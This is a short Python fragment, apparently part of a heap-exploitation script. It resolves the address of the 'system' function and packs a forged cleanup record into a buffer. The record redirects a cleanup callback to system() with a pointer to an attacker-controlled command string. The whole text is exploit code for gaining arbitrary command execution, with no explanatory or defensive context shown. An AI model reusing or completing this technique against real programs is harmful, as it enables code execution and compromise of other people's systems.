import struct
entry_point, image_base = lookup_export(mappings, "system")
record_buffer = bytearray(layout["value_bytes"])
struct.pack_into("<Q", record_buffer,
                 heap["pool_field_offsets"]["cleanup"],
                 pool_address + layout["cleanup_record_offset"])
struct.pack_into("<QQQ", record_buffer,
                 layout["cleanup_record_offset"],
                 entry_point,
                 heap_base + heap["callback_command_offset"], 0)
